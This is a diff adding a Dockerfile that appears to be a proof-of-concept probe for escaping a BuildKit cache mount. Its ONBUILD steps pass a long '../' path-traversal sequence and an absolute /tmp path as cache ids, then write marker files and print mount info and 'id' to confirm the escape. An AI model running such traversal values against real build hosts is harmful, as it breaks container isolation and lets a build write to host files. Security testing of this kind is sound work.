@@ -1,0 +1,7 @@
+FROM alpine:3.20 AS base
+ONBUILD RUN --mount=type=cache,target=/hcA,id=../../../../../../../../../../../../../../../../tmp/bc_cache_onb_a7f3c9 sh -c 'set +e; echo "===CACHE_A_BEGIN==="; echo "--MOUNTINFO--"; grep " /hcA " /proc/self/mountinfo; echo "--LS--"; ls -la /hcA 2>&1 | head -6; echo "cachetraversal-a7f3c9" > /hcA/marker.txt 2>&1; echo "ca_rc=$?"; cat /hcA/marker.txt 2>&1; echo "===CACHE_A_END==="'
+ONBUILD RUN --mount=type=cache,target=/hcB,id=bc_plain_onb_a7f3c9 sh -c 'set +e; echo "===CACHE_B_BEGIN==="; echo "--MOUNTINFO--"; grep " /hcB " /proc/self/mountinfo; echo "plain-a7f3c9" > /hcB/marker.txt 2>&1; echo "cb_rc=$?"; cat /hcB/marker.txt 2>&1; echo "===CACHE_B_END==="'
+ONBUILD RUN --mount=type=cache,target=/hcC,id=/tmp/bc_cache_abs_onb_a7f3c9 sh -c 'set +e; echo "===CACHE_C_BEGIN==="; grep " /hcC " /proc/self/mountinfo; echo "abs-a7f3c9" > /hcC/marker.txt 2>&1; echo "cc_rc=$?"; cat /hcC/marker.txt 2>&1; echo "===CACHE_C_END==="'
+FROM base
+RUN sh -c 'echo "===TRIGGER_CHECK2==="; id'
+CMD ["sh","-c","sleep 30"]
